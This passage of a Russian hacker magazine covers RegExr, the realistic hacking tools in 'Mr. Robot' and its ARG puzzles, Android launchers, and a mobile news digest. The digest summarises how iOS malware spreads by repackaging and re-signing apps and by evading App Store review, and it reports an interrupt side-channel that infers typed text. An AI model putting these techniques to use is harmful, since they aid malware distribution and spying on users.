           чается, как сложно ее эксплуатировать и каков уровень опасности.
        Но самое интересное — это, конечно, уроки, в ходе которых тебе
          практически на пальцах показывают, как эксплуатируются баги того
         или иного типа. Иногда даже попадаются интерактивные элемен-
         ты — к примеру, тебе предлагают заполнить какое-нибудь поле или
          вписать кусочек кода.





         К каждому из уроков приложена справка о том, как можно за-
         щититься  от описанной уязвимости, а для самых прилежных
          есть тесты на закрепление материала. В общем, отличный учеб-
          ник для тех, кто способен читать на английском. И даже если это
         не про тебя, сайт стоит того, чтобы попробовать разобраться
         со словарем.


       REGEXR — СЕРВИС ДЛЯ ПАРСИНГА ТЕКСТА И ИЗУЧЕНИЯ РЕ-
       ГУЛЯРНЫХ ВЫРАЖЕНИЙ
             regexr.com
3





                            Регулярные выражения — это потрясающе мощный способ авто-
         матизации работы с текстом. Нужно убрать лишние пробелы? Напи-
          сать некоторые слова заглавными буквами? Убрать спецсимволы?
          Хочется сказать, что нет ничего проще, но это было бы обманом:
         на освоение регэкспов потребуется какое-то время, и мало кто вла-
          деет ими в совершенстве. Сервис RegExr поможет тебе в изучении
          регулярок, да и потом не раз пригодится.
           Зайдя на regexr.com, ты увидишь, что окно поделено на три об-
           ласти. В большое поле вставляется исходный текст. Сверху над
        ним ты пишешь свое регулярное выражение, а внизу можешь на-
         блюдать результаты его работы. Но обрати внимание — нижняя
          область многофункциональна, переключатель Tools над ней выби-
          рает режим работы.
         Replace — это замена найденных подстрок. На что именно заме-
           нять, ты можешь вписать в строке под плашкой Tools.
           List — список найденных подстрок. Опять же есть поле, в котором
        можно задать формат списка.
          Details — подробности о результатах поиска. Кликни на любое
         подсвеченное синим слово в верхней области, и ты сможешь уз-
          нать номер результата, его длину, адрес начала и адрес конца под-
          строки и так далее.
          Explain — крайне интересный режим, в котором автоматически
          создается описание введенного тобой регулярного выражения.
         Для изучения регэкспов совершенно незаменимая штука.





       Меню слева, кстати, полностью посвящено обучению. Если ты
         уже знаком с регулярками и тебе нужна только подсказка, выби-
         рай пункт Cheatsheet, там собрано все самое нужное. Если толь-
          ко учишься писать регэкспы и владеешь английским, загляни
          в Reference и походи по разделам. В нижней части будут отобра-
          жаться объяснения с примерами. Еще больше примеров собрано
          в разделе Examples.
            Пожалуй, самый интересный пункт меню — Community. Это база
         данных регулярных выражений, расшаренных пользователями сер-
          виса. Они отсортированы по популярности, так что есть все шансы,
          что ты увидишь нужный тебе регэксп в первых строчках.
 СЦЕНА
«МИСТЕР РОБОТ»
ВОЗВРАЩАЕТСЯ
 КАК СЕРИАЛ ПРО ХАКЕРОВ
 ПОКОРИЛ ЗРИТЕЛЕЙ

                                                                          Андрей Письменный





 Восторженные отзывы о сериале «Мистер Робот» были
 слышны со всех сторон еще до того, как он получил два
 «Золотых глобуса». Удивительно: как мрачной теледраме
 про хакеров удалось привлечь широкую аудиторию? На-
 чало второго сезона — самое время поговорить об этом
 и о хакерских играх, которые сопровождают премьеру.


 S02E01
  14 июля 2016 года в США на экраны вышла первая серия второго сезона се-
  риала «Мистер Робот» (а первую половину этой двойной серии создатели шоу
  слили в Twitter еще за три дня до этого). Как всегда, фанаты сразу же стали
  внимательнейшим образом изучать все, что было показано на экранах ком-
  пьютеров героев. И, как обычно, они не были разочарованы. Даже наоборот —
  в этот раз улов оказался еще богаче.
     Вот один из персонажей (Дарлен) со своего компьютера активирует
  криптолокер под названием Cryptowall. Это один из самых известных троя-
  нов-вымогателей: за прошлые два года он причинил убытков на сумму около
  18 миллионов долларов.





  Дарлен использует Social-Engineering Toolkit (SET), чтобы создать атакую-
  щие скрипты, и добавляет Cryptowall в качестве «полезной нагрузки». Social-
  Engineering Toolkit — широко известная и популярная хакерская утилита,
  «Хакер» о ней подробно писал еще в 2011 году. Все команды на экране макси-
  мально приближены к реальности.





  А вот компьютеры банка, который атаковала Дарлен, показывают веселую кар-
  тинку и просят выкуп.





  Да, редко когда атакующим удается вот так зрелищно за-
  нять своей заставкой все экраны разом, да и сумма выку-
  па (5,9 миллиона долларов) серьезно превышает средние
  500–2000 долларов, которые просят вымогатели. Но «Ми-
  стер Робот» — это все же художественный фильм, и жанр
  требует художественных преувеличений.                                                           INFO
     Впрочем, мы еще не закончили с разбором этой ата-
  ки — на этот раз авторы сериала приготовили кое-что    Издание Motherboard
                                                                                пишет, что картинка  особенное.                                                                                   с джокером —
    В первом сезоне все засвеченные на экране IP-адре-         символика
  са были поддельными. Фанаты даже жаловались, когда      известного хакера
                                                                                       th3 j35t3r, которого  видели, что части адреса превышают максимально до-
                                                                           якобы чуть не взяли
  пустимое число 255. Если учесть общий уровень реализ-                                                                                  техническим
  ма, авторы, скорее всего, делали это умышленно — что-       консультантом.
  бы никому не пришло в голову ломиться по этим адресам
  с порт-сканерами наперевес.





  Адреса 192.251.68.254 и 192.251.68.239, которые мелькают на экране Дарлен
  в первой серии второго сезона, уже настоящие. Можешь хоть сейчас зайти
  по ним через браузер и увидеть заставку «командного центра» криптолокера
  и таймер, который отсчитывает 24 часа.
     Это, конечно, бутафория — в исходниках скрипта web_analytics.js, привя-
  занного к странице, честно написано «USA Network» (название телеканала, где
  показывают сериал) и «Mr. Robot : S2 Easter Egg Sites : Ransomware : Home»
  (пасхальное яйцо «Рансомварь» для второго сезона Mr. Robot).





  Не думай, что создатели шоу что-то упустили и забыли убрать свои следы
  из кода страницы. Наоборот — для любопытных тут скрыто кое-что интерес-
  ное. Чуть ниже идет длинная строка в формате Base64. Если ее расшифро-
  вать, то получится сообщение — цитата из Томаса Джефферсона. Вот ее рус-
  ский перевод:
    «Я считаю, что институт банков более опасен, чем вооруженная армия.
  Если американский народ позволит частным банкам управлять выпуском ва-
  люты, банки и корпорации, которыми заправляют банкиры, будут отнимать
  у людей всю их собственность до тех пор, пока их дети не проснутся бездо-
  мными на земле, когда-то завоеванной их предками».
     Что ж, изречение Джефферсона как нельзя лучше подходит под главную
  тему сериала. Именно с банковской системой и неравноправием пытаются
  бороться хакеры из «Мистера Робота».

 «ДОКТОР ХАУС» ПРО ХАКЕРОВ
  На случай, если ты незнаком с сюжетом сериала, уделю пару абзацев расска-
  зу о том, что же такое «Мистер Робот».
    В целом это уже практически стандартная киберпанковская история: па-
  рень (Эллиот) днем работает в офисе, а по ночам он хакер. Но в отличие
  от Нео он не умеет взламывать Матрицу, гнуть ложки взглядом и замедлять
  пули. Его суперспособность выглядит значительно правдоподобнее: он при-
  ходит домой, скидывает с головы капюшон, садится за клавиатуру и начинает
  настукивать команды в консоли.





  Количество личной информации, которую любой человек оставляет в Сети,
  позволяет герою узнать о нем больше, чем Шерлок Холмс выяснил бы, изучая
  детали одежды. Этот сюжет находит живейший отклик у аудитории: даже если
  простой зритель не понимает мелькающие на экранах команды, он помнит —
  к его данным получить доступ настолько же легко.
     Действие «Мистера Робота» происходит в настоящем Нью-Йорке, однако
  мир вокруг немного карикатурный. Компания, в которой работает Эллиот, за-
  нимается киберсекьюрити и называется Allsafe, что можно перевести на рус-
  ский примерно как «Под защитой»; главный клиент Allsafe — ненавистная
  Эллиоту E Corp, которую он называет не иначе как Evil Corp («Злая корпора-
  ция»). Вместе с внутренними монологами героя, которые сопровождают зри-
  теля на протяжении всего сериала, создается впечатление, что это не фильм,
  а оживший комикс.
    И все это — в сочетании с максимально правдоподобно изображенным
  взломом. В каком-то роде «Мистер Робот» — это House про хакеров. Да,
  в «Хаусе» один за другим идут крайне редкие медицинские случаи, но все они
  реальны. Примерно то же самое со взломом в «Роботе»: сюжеты некоторых
  серий из первого сезона практически совпадали с заголовками новостей.





                  Эллиот не очень любит окружающих людей. Или просто не понимает их?





                                     «Мистер Робот» — не только про взлом и борь-
                                           бу с системой. Без красавиц тоже не обошлось


 ВО ВСЕХ ПОДРОБНОСТЯХ
  Создатели сериала верно рассудили, что если герои будут с очень значитель-
  ным видом смотреть на экраны и рассуждать о судьбах человечества, то экра-
  ны не должны показывать ерунду, иначе весь пафос может сломаться в глазах
  посвященного зрителя (а таких все больше).
     Поэтому у съемочной группы есть «ответственный за реализм», его зовут
  Майкл Баззел. С 1990 года он работал детективом в отделе киберпреступно-
  сти в полиции, и, надо думать, это был один из первых отделов киберпреступ-
  ности. Потом Баззел перевелся в ФБР, а через десять лет карьеры в органах
  отправился искать счастья в Голливуд.

                    WARNING

                                 Эта часть статьи содержит небольшие спойлеры, которые каса-
                                ются первого сезона. Если ты его не смотрел и не хочешь знать
                               даже намеков на разгадки больших тайн, лучше пока не читай.


  Благодаря работе Баззела ты можешь увидеть на экране:
  •  Kali Linux;
  •  Raspberry Pi;
  •  защищенную почту ProtonMail;
  •  уже упомянутый Social-Engineering Toolkit;
  •  Metasploit и Meterpreter;
  •  знаменитый переборщик паролей John the Ripper;
  •  наделавший немало шума эксплоит Shellshock;
  •  сканеры Bluetooth btscanner и bluesniff;
  •  рут Android при помощи SuperSU и установку FlexiSPY;
  •  взлом автомобиля через CAN bus (см. тему номера в «Хакере» № 194);
  •  совершенно реальную уязвимость дверных замков Onity;
  •  стеганографию в звуковых файлах при помощи DeepSound;
  •  полицейскую базу данных под названием CLEAR
     и многие другие вещи, перечислять которые можно еще долго.

  Показаны даже настоящие хакерские устройства: одно герои применяли
  для перехвата радиосигналов, другое (Tastic RFID Thief) — для удаленного счи-
  тывания RFID. Подробнее о таких штуках читай в статье «Подбираем девайсы
  для настоящего пентестера».





  Создателей сериала вдохновили в том числе реальные события — такие,
  как «арабская весна» или взлом спецслужбами США иранского завода по обо-
  гащению урана. Видеопослания хакерской группы fsociety — аллюзия на по-
  слание «Анонима» Церкви саентологии. Не забыли и про руткиты Sony, и про
  историю с Ashley Madison (чтобы успеть включить ее в сценарий, одну из серий
  даже пришлось задержать).
     Вот еще крутой пример. В одной из сцен Эллиот делает вид, что отражает
  DDoS-атаку, но на самом деле он устанавливает на компьютер руткит. Зритель,
  понимающий, что происходит в консоли, что-то заподозрит до того, как руткит
  сыграет в сюжете.





 И это не говоря уже про всякие мелочи вроде совпадающих в разных сценах
  IP-адресов или правдоподобно выглядящих сетевых логов. Происходящее
  на экранах компьютеров иногда даже подчеркивает личность персонажей:
  Эллиот, к примеру, работает в GNOME (иногда LXDE), а его соперник Тай-
  релл — в KDE. Создатели сериала проследили за тем, чтобы так было в любой
  сцене, где видно, как один из них использует графическую оболочку.
    Ну а социальная инженерия — это вообще святое. Она сочетается с актер-
  ской игрой и телеэкраном в разы лучше, чем консоль, и это не могло пройти
  мимо сценаристов. Вспомнить, к примеру, эпизоды, где Эллиот по телефону
  притворяется сотрудником техподдержки или прикидывается эксцентричным
  миллионером перед работником дата-центра. Это одновременно и мастер-
  ское изображение хакерских уловок, и цепляющие зрителя сцены.

  Кое-что для киноманов

  «Пасхальные  яйца»  в «Мистере
  Роботе» есть не только для хаке-
  ров, но и для заядлых любителей
  кино. При желании можно разгля-
  деть аллюзии на «Заводной апель-
  син», «Крестного отца» и другие
  знаменитые кинокартины. Иногда
  это непосредственные отсылки (к
  примеру, очки Дарлен с сердеч-
  ками напрямую взяты из «Лолиты»
  Кубрика), иногда цитируется толь-
  ко композиция кадра или еще ка-
  кой-нибудь прием.
    В одной из сцен, посвященных
  прошлому героя, в газете мелька-
  ет реклама «Криминального чти-
  ва».  Говорят,  серию  пришлось
  отправлять на согласование Та-
  рантино, чтобы включить этот эпи-
  зод. Ну а про смело позаимство-
  ванный из «Бойцовского клуба»
  сюжетный поворот в первом сезо-
  не и говорить не приходится.



  «Мистер Робот» — это, конечно, не первый случай, когда в кино красиво по-
  казывают реалистичные консольные команды. Не исключено, что создателей
  вдохновила «Девушка с татуировкой дракона». Та тоже что-то делала с Nmap
  на своем макбуке, и режиссера Дэвида Финчера в связи с этим в очередной
  раз хвалили за потрясающе проработанные детали. Но одно дело — Nmap
  мимолетом, другое дело — Kali, SET и Metasploit почти в каждой серии, крупно
  и разборчиво. Разница примерно как между осторожной постельной сценой
  в семейном фильме и кинокартиной производства Brazzers.





                Kali и SET — самые настоящие. Только, Эллиот, что же ты под рутом-то сидишь?



 НАЧАЛО ТРОПЫ
  Упомянутая в начале статьи «пасхалка» — это, похоже, только одна из целой
  серии. Не менее интересная история приключилась после выхода трейлера
  второго сезона «Мистера Робота» в середине мая 2016 года (за месяц до его
  показа). В трейлере был скрыт очередной секрет, вернее «начало тропы».
    Мельком в одном из кадров показывают телефонный номер, зарегистри-
  рованный в США. Кто-то решился по нему позвонить и услышал голос на ав-
  тоответчике. Голос произносит: «Спасибо, что позвонили в службу поддержки
  E Corp. По причине недавних событий мы принимаем необычно большое чис-
  ло звонков. Чтобы избежать ожидания на линии, вы можете воспользоваться
  нашим веб-сайтом по адресу www…». На этом сообщение обрывается, идет
  шум, а потом другой голос говорит: «Столь яркий свет невозможен без тьмы»,
  и дальше — серия сигналов.
    Фраза про свет и тьму — это цитата из Фрэнсиса Бэкона. Скоопериро-
  вавшись через Reddit, поклонники сериала вскоре догадались, что Бэкон тут
  неспроста. Если записать сигналы в двоичном виде, а потом декодировать
  при помощи шифра Бэкона, то получается строчка FSOCDOTSH, то есть fsoc.
  sh, а это валидный URL сайта.





  На главной странице fsoc.sh нарисован крутящийся глаз, а вокруг него — циф-
  ры и буквы: 4C4F4F4B205550. Правильно, это шестнадцатеричный код! Пере-
  водим в ASCII и получаем слова LOOK UP — «смотри вверх». Ровно над гла-
  зом — мигающий курсор. Если перевести его мигание в азбуку Морзе, то
  выйдет фраза LEAVE ME HERE — «оставь меня здесь». Вставляем ее в строку
  под глазом — и готово! У нас есть доступ к системе.
    Первые 509 человек, которые проследовали по этому пути, получили худи
  с символикой сериала, остальные могут побаловаться с поддельной опера-
  ционкой, работающей внутри браузера. В ней скрыты всякие допматериалы
  к «Мистеру Роботу» и даже игра «Змейка». А еще предлагается оставить адрес
  своей электронной почты, чтобы «вступить в ряды fsociety».





  Для этих необычных забав есть название — Alternate
   Reality Games (ARG), игры в альтернативную реальность.
  «Началом тропы» (trailhead) в таких играх называют за-
  травку, с которой игроки приступают к расследованию.
  ARG изобрели в середине двухтысячных и успешно ис-
  пользовали для раскрутки разных игр, фильмов и других        INFO
  продуктов.
                                                                         Подробнее об ARG    Наиболее известные ARG делали в поддержку игры                                                                          ты можешь прочесть
  Halo 2, фильмов «Искусственный разум» и «Темный ры-      в статье «Загадка
  царь», жвачки  Wrigley и даже операционной системы     „Цикады“» в «Хакере»
                                            № 184.  Windows Vista. Не все шаги в ARG связаны с интернетом,
  сайтами и шифрами — часто попадаются задания, кото-
  рые требуют от игроков выйти на улицу и искать подсказки там. Или даже на-
  прямую взаимодействовать с персонажами — к примеру, по телефону.
     Кажется, для поклонников «Мистера Робота» веселье только начинает-
  ся — создатели сериала не в последний раз отправляют их на захватывающий
  криптографический квест. Взять, к примеру, QR-код, карандашная зарисов-
  ка которого мелькает, когда Эллиот листает свою тетрадь в первой серии но-
  вого сезона. Если распознать код, то он отправит на сайт conficturaindustries.
  com, оформленный в неповторимом стиле домашних страничек из девяно-
  стых — с копающими рабочими, счетчиком просмотров и крутящимся зна-
  ком @. Что это? Зачем? Построят ли пиксельные рабочие что-то потрясающее
  к концу сезона? Кто знает!.





  Сложно предсказать, насколько далеко заведет зрителей/игроков очередная
  тропа, но в том, что загадки еще будут, можно не сомневаться. И у тебя есть
  шанс попытаться найти их и решить первым.
MOBILE


ВЫПУСК #22.
HTC SENSE, ASUS ZENUI И MIUI
КАРМАННЫЙНА ЛЮБОМ СМАРТФОНЕ                  Не каждый может себе по-
                      зволить купить несколько
                    смартфонов разных произ-
                     водителей только для того,СОФТ чтобы оценить использу-
                  емую в них графическую
                     оболочку и ее возмож-
                       ности. Но у каждого есть
                       хотя бы один смартфон
                     на Android, и на него мож-
                    но без проблем установить
                     оригинальный домашний
                     экран от разных произ-
                      водителей. Сегодня в вы-
                        пуске: устанавливаем до-
                  машние экраны HTC Sense,
                      Asus ZenUI и MIUI на любой
                      Android-смартфон без root.




HTC SENSE HOME
Как ни странно, домашний экран HTC под
названием HTC Sense Home официаль-
но и совершенно бесплатно доступен
в Google Play. Однако установить его смо-
гут далеко не все владельцы Android-ап-
паратов: доступен он только для смартфо-
нов самой же HTC, и то при условии, что
на них стоит Android 5.0. К счастью, в сам
домашний экран никакой защиты от запу-
ска на других устройствах не встроено, по-
этому можно просто скачать APK из любо-
го другого места, например 4PDA. Там же
можно найти другие приложения от HTC.
  Чем же интересен HTC Sense Home?
Во-первых, минимализмом. HTC  нако-
нец поняла, что не стоит глубоко моди-
фицировать Android и лучше оставить его
простым и легким, поэтому Sense Home
отличается  практически полным  отсут-
ствием настроек и простым, элегантным
дизайном. Во-вторых, BlinkFeed — на-
икрутейший  агрегатор  новостей,  инте-
грируемый с  Twitter, Facebook, LinkedIn
и News Republic. Он доступен слева, там,               HTC Sense
где в официальном лаунчере Google нахо-               Home
дится Google Now. Ну и третье — это под-                 Платформа:
держка огромного количества уже готовых                     Android 5.0
тем.                                                   Цена:
  В остальном все довольно стандартно,                    бесплатно
но лаунчер действительно удобен, и сле-
зать с него совсем не хочется.



ZENUI LAUNCHER
А это уже домашний экран  от ASUS.
Как и HTC Sense Home, он доступен
в Play Market, но без всяких ограничений
по устройствам — поддерживаются прак-
тически все смартфоны.
  Фишка  этого  лаунчера —  глубокая
настраиваемость  и  функциональность.
Здесь можно изменить практически все:
сетку и размер иконок, эффекты пере-
ключения между рабочими столами, на-
строить прозрачность строки состояния,
сменить тему и даже переключить лаун-
чер в так называемый однослойный ре-
жим, когда иконки всех установленных
приложений находятся на рабочих сто-
лах, а меню приложений нет вообще (как
в iPhone).
   Возможности ZenUI Launcher тоже ши-
роки:
•  отображение количества непрочитан-
   ных сообщений над значками Gmail,
  SMS и телефона;
•  быстрый поиск по веб-сайтам и прило-
  жениям с подсказками, доступен через                  ZenUI
   свайп вниз (по сути, аналог Spotlight                  Launcher
   из iOS);                                           Платформа:
•  интеллектуальная группировка прило-                     Android 4.3+
   жений по категориям;                                 Цена:
•  возможность установить PIN-код на за-                    бесплатно
   пуск приложения (что не помешает за-
   пустить его через другой лаунчер);
•  множество  вариантов  отображения
  меню приложений;
•  папки в меню приложений.

Лаунчер позволяет установить и любые
другие приложения от ASUS с помощью
специального  приложения  «Семейство
ZenUI».



MI HOME
MIUI — одна из лучших кастомных прошивок,
однако, сколько бы ни старались ромоделы,
весь парк устройств Android им не покрыть.
Если для твоего смартфона нет сборки MIUI,
ты все равно можешь хотя бы частично оце-
нить возможности этой прошивки — устано-
ви Mi Home. Через Play Market это сделать
не удастся, поэтому придется опять же идти
на 4PDA и качать APK.
   Mi Home, как и сама прошивка, выпол-
нен в духе iOS: квадратные иконки со скру-
гленными углами, меню настроек в стиле
iOS 7–10, никакого меню приложений —
все иконки размещаются на рабочих сто-
лах. Но есть здесь и свои находки: напри-
мер, поиск приложений с помощью T9
(вытягивается с нижней стороны экрана),
поддержка тем, которые меняют лаунчер
до неузнаваемости, возможность спря-
тать приложения и установить PIN-код
на доступ к ним, возможность тонкой на-
стройки сетки рабочего стола эффектов
перехода плюс интересная функция, по-
зволяющая менять рабочие столы при пе-
ретаскивании иконки наклоном экрана.                    Mi Home
  В целом все красиво, приятно глазу                 Платформа:
и удобно. Единственная проблема в том,                      Android 4.0+
что последняя версия Mi Home — это до-                  Цена:
машний экран MIUI 6, а уже вышли седь-                    бесплатно
мая и восьмая версия системы.
   Скачать другие приложения MIUI мож-
но по этой ссылке. Кроме Mi Home, там
можно найти:
•  MIUI Dialer — номеронабиратель с бло-
   киратором звонков;
•  MIUI Messaging — SMS с возможно-
   стью блокировки спама и бесплатного
  общения с юзерами MIUI;
•  Mi Cloud — синхронизация контактов,
  SMS и фотографий с облаком.
MOBILE





                                                                                 Евгений Зобнин
                                                                                                zobnin@gmail.comДАЙДЖЕСТ
НОВОСТЕЙ
ЗА МЕСЯЦ





Сегодня в выпуске: релиз джейлбрейка для iOS 9.3.3, за-
пуск десктопных приложений в Ubuntu Touch, прошивка
Android для хакеров и пентестеров, исследование по-
ведения приложений прямо на устройстве, превраще-
ние смартфона в ноутбук, первый коммерческий смарт-
фон на Sailfish OS. А также: инструкция по максимальной
защите данных на iPhone, рассказ о вирусах для iOS
без джейлбрейка и научный эксперимент по перехвату
введенных данных с помощью слежения за прерываниями
и переключениями контекста.

РЕЛИЗЫ
Важнейший релиз июля — это, без сомнения, джейлбрейк Pangu для iOS
9.2–9.3.3. В этот раз ребята удивили не только оперативностью, но и самой
реализацией джейлбрейка. Во-первых, это своего рода полупривязанный
джейлбрейк, он будет сбрасываться после каждой перезагрузки устройства,
однако, чтобы вернуть все на место, необязательно подключать смартфон
к компу, достаточно запустить приложение PP.
   Во-вторых, джейлбрейк доступен только для 64-битных устройств, а это
значит, что пользователи iPhone ниже 5s пролетают. Ну а в-третьих, теперь
нет никакой утилиты для запуска джейлбрейка. Он распространяется в фор-
ме IPA-пакета, его необходимо подписать и установить на смартфон c помо-
щью Cydia Impactor, версия которого есть для macOS, Windows и даже Linux
(инструкция на английском).
   Разумеется, не все твики совместимы с iOS 9.2–9.3, поэтому ребята
с Reddit общими усилиями составили постоянно пополняемую табличку, в ко-
торой перечислены совместимые и несовместимые твики.
   Что касается мобильных ОС, то самое важное обновление получила
Ubuntu Touch (OTA-12). Сделаны небольшие косметические улучшения и не-
большое расширение функциональности, а главное — разработчики нако-
нец-то добавили возможность установки и запуска обычных настольных при-
ложений Linux. Пока это экспериментальная функция, для включения которой
необходимо активировать режим разработчика (Settings -> Developer), а затем
установить приложение через терминал. Пример для Firefox:

$ libertine-container-manager create --id my-container --name
    "My Container" --distro vivid --type chroot
$ libertine-container-manager install-package --id my-container
    --package firefox

Обновление должны автоматически получить все пользователи Meizu MX4 / PRO
5, Nexus 4, Nexus 7 и Bq Aquaris E5/E4.5/M10 с установленной Ubuntu Touch.
  В конце месяца получила обновление
одна из самых неоднозначных операцион-
ных систем — Remix OS. Если кто не помнит,
это адаптированная под десктопы и боль-
шие экраны версия Android, о которой мы
уже рассказывали во всех подробностях.
Версия 3.0 теперь основана на Android 6.0,
но, кроме этого, не включает в себя ничего
принципиально нового.
   Еще один интересный, но гораздо ме-
нее громкий релиз — это выпуск для Android
приложения Prisma, преобразующего снимки
с помощью нейросети.
   Ну и конечно же, мы не можем не ска-
зать о запуске проекта The Android Open
Pwn Project, в рамках которого идет разра-
ботка Android-прошивки для хакеров и пен-
тестеров. Прошивка включает в себя  Kali
NetHunter, набор утилит, написанных ребя-
тами из Pwnie Express, и автоматически ин-
тегрируется с платформой Pulse, позволяю-
щей собирать информацию о потенциально          Десктопные приложения
уязвимых и зловредных устройствах в сети.             в Ubuntu Touch
   Пока   прошивка   доступна   только
для смартфонов Nexus 4 и  Nokia N900
и планшета Nexus 7.

ИНСТРУМЕНТЫ
•  gplay-scraper — простой скрипт для поиска приложений Google Play из ко-
   мандной строки.
•  Android Package Inspector — модуль Xposed для динамического анализа
   приложений. Имеет огромное число возможностей: получение информа-
   ции о полномочиях, активностях, контент-провайдерах и сервисах, перехват
   обращений к SQLite, HTTP-серверам, файловой системе, буферу обмена,
   криптографическим функциям и многому другому. Для удобства сбора дан-
   ных предусмотрен наглядный веб-интерфейс.
•  Simplify — деобфускатор байт-кода Dalvik (Android), использующий вирту-
   альную машину для запуска кода и формирования графа его исполнения.
  В отличие от традиционных деобфускаторов может эффективно «приводить
   в порядок» код вне зависимости от используемых инструментов и техник
   обфускации.
•  GyroEmu — модуль Xposed, эмулирующий гироскоп с помощью акселеро-
   метра и магнитометра. Зачем он нужен? Чтобы играть в надоевшую всем
   игру в режиме AR на бюджетниках, например.





                           Декомпилированный код до ...





                                                                                 ...и после применения Simplify

УСТРОЙСТВА
Наверное, самая интересная новость июля, связанная с устройствами, — это
начало сбора средств на Superbook — устройство в форм-факторе ноутбука,
которое фактически только выводит картинку на экран и позволяет вводить
текст, тогда как в качестве вычислительной начинки используется смартфон.
   Для бэкеров Kickstarter устройство обойдется всего в 99 долларов (рыноч-
ная цена будет в районе 120–150 долларов). За эти деньги они получат не-
доноутбук с экраном на 11,6 дюйма (разрешение HD или Full HD), батарейкой
на десять часов работы, тачпадом и портом для подключения смартфона.
   За  формирование  рабочего  стола  будет  отвечать  приложение
Andromium OS, которое можно скачать уже сейчас. Однако в данный момент
оно малофункционально.





                                                                The Superbook


Еще один интересный  де-
вайс —  Chuwi  Vi10  Plus.
С точки зрения начинки это
вполне стандартный по ны-
нешним временам планшет
на  базе  процессора   Intel
Atom Cherry  Trail X5 с дву-
мя  гигабайтами  оператив-
ной  памяти,  10,8-дюймо-
вым экраном с разрешением
1920  x 1280 и батарейкой
на 8400 мА  · ч. А интересен
он выбором предустановлен-
ной ОС. В ее качестве тут вы-
ступает та самая Remix OS,
то есть адаптированная под
десктопы и большие экраны
версия Android, которой мы
посвятили целую статью.
   Так  как  устройство  ки-
тайское (хоть и от хороше-                                                Intex Aqua Fish
го производителя), то и цена
соответствующая: 169 дол-
ларов за версию с двумя гигабайтами оперативки и 239 долларов — с четырь-
мя плюс предустановленная Windows 10 в качестве второй ОС.



  Chuwi Vi10 Plus





Нельзя не отметить и другой необычный девайс на базе экзотической ОС —
смартфон Aqua Fish индийской компании Intex. Это первый коммерческий
смартфон, работающий на базе Sailfish OS 2.0, созданной бывшими сотруд-
никами Nokia и выбранной в качестве национальной российской мобильной
платформы.
   При вполне неплохой начинке, включающей в себя четырехъядерный про-
цессор, 2 Гбайт оперативной и 16 Гбайт постоянной памяти и экране в 5 дюй-
мов смартфон стоит всего 85 долларов, но пока доступен только в Индии (не-
смотря на то, что продается через eBay).

ПОЧИТАТЬ
Ok Google — красивый интерактивный список из более ста команд Google Now
/ Google Assistent. К сожалению, только на английском, но у большинства ко-
манд есть русские аналоги.

Securing a travel iPhone — небольшая статья с инструкцией по настройке
iPhone перед долгой поездкой. Основная цель всех настроек — сделать так,
чтобы никто не смог получить доступ к данным, если смартфон будет утерян,
или перехватить трафик. В частности, автор рекомендует придумать длинный
пароль, отключить Siri и любые функции, которые могут быть доступны с экра-
на блокировки, активировать двухфакторную аутентификацию в iCloud, устано-
вить мессенджер Signal, о котором Сноуден отзывается как о самом безопас-
ном, создать новый адрес электронной почты.

Fruit vs Zombies: Defeat Non-jailbroken iOS Malware (pdf) — исследование
зловредов для iPhone, не требующих джейлбрейка, большинство из которых
были найдены в App Store. Презентация охватывает практически все аспек-
ты создания и распространения таких зловредов. В частности, автор говорит,
что наиболее действенный способ распространения зловредного кода — это
встраивание в среду разработки (Xcode) или сторонние библиотеки
   Второй путь распространения — перепаковка легитимных приложений.
Злоумышленник берет популярное приложение, дешифрует и распаковывает
пакет, внедряет собственную библиотеку, подписывает своим ключом и рас-
пространяет через альтернативные маркеты (vShare, например), подписан-
ные Enterprise-ключом, либо подписывает само приложение Enterprise-ключом
и распространяет его через фишинговые сайты, либо находит способ заста-
вить юзера установить приложения методом USB sideload.
  Еще один способ распространения — публикация приложения в App Store.
Для этого приложение может использовать глубокую обфускацию, эксплуати-
ровать уязвимости в самом себе (!), пробовать выяснить, что находится в те-
стовом окружении Apple, и в этом случае отключать все зловредные функции
или просто надеяться на удачу, как это сделали создатели ZergHelper.





                                                     Перепаковка приложения


Lifehacker Pack for Android: Our List of the Essential Android Apps — список must
have приложений для любого пользователя Android. В целом ничего примеча-
тельного: Any.Do, Inbox, Dropbox, Chrome и прочее.

Protecting Android with more Linux kernel defenses — рассказ разработчи-
ков Android об используемых механизмах безопасности. В частности, речь
идет о запрете модификации исполняемого кода в памяти (CONFIG_DEBUG_
RODATA) с помощью патчей Grsecurity и наработок Qualcomm, о запрете до-
ступа ядра к памяти процессов, о защите стека от переполнения (с помощью
компилятора), об ограничении доступа к низкоуровневым функциям железа
с помощью ioctl, о внедрении механизма изоляции процессов seccomp-bpf.

Don’t Interrupt Me While  I Type: Inferring Text Entered Through Gesture Typing on
Android Keyboards — интересное исследование, посвященное перехвату
пользовательского ввода с помощью слежения за системными прерывания-
ми и переключениями контекста. В основу исследования положены два фак-
та: 1) каждый раз, когда юзер прикладывает палец к экрану или убирает его
с экрана, возникает системное прерывание; 2) информация о системных пре-
рываниях доступна любому непривилегированному процессу в Android.
   Чтобы проверить, можно ли на основе этих данных узнать, что вводит поль-
зователь, авторы создали нейронную сеть и обучили ее на юзерах, использу-
ющих клавиатуру с поддержкой технологии swype (когда для ввода слов ис-
пользуются жесты). Затем они закодили небольшое приложение, следящее
за прерываниями и скармливающее эти данные нейронной сети. В результа-
те сеть смогла предсказать ввод в 60% случаев. Естественно, речь идет о по-
вседневных словах и предложениях, пароли ей недоступны.
 MOBILE: Колонка Евгения Зобнина
УСТРОЙСТВО
СНОУДЕНА





                       Евгений Зобнин
                                                      zobnin@gmail.com


 Эдвард Сноуден стал настолько известной и значимой фигурой,
 что любое его интервью, заявление или сумасшедшая идея сра-
 зу разлетаются по миру и оседают миллионами цитат в твиттере.
 Но в этот раз Сноуден не просто высказался, а предложил кон-
 цепт чехла для смартфонов, который способен детектировать (и
 глушить) любые испускаемые смартфоном радиосигналы, чтобы
 защитить его владельца от прослушки и определения местополо-
 жения. Как работает этот девайс и что он дает его владельцу? По-
 пробуем разобраться.




 Начнем с того, что никакого устройства еще не существует. Ни в виде концеп-
 та, ни даже в виде голой платы с FPGA-чипом. Все, что есть, — всего лишь
 идея, реализуемость которой проверили опытным путем, перехватив сигналы,
 испускаемые радиомодулями, GPS-модулем и NFC-чипом iPhone 6s. Поэтому,
 говоря об «устройстве Сноудена» как о чем-то реально существующем, жур-
 налисты, мягко выражаясь, преувеличивают.





                                                           Рендер устройства


 Второе: предполагаемый девайс сам по себе не является средством от про-
 слушки. Это монитор, задача которого — следить за тем, не передается
 ли какая-либо информация по любому из радиоканалов (GSM, GPS, Wi-Fi,
